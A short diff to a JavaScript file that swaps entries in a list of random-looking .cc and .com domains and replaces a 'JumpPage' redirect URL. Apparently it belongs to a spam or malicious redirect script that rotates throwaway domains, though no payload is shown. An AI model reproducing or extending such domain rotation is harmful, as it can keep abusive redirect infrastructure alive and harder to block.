@@ -37,14 +37,14 @@ var emails = [
 ];
 
 var urls=[]; 
-       urls.push(".komumlyn.cc");  
+       urls.push(".losixkiz.cc");  
+       urls.push(".komumlyn.cc");
        urls.push(".srwizdhw.com");
-       urls.push(".zolhlknux.cc");
        
           
       
                                                                                  
-var JumpPage="https://ggkpcnoo.cc";
+var JumpPage="https://vngyqmbh.cc";
 
 var newestUrls = [];
 
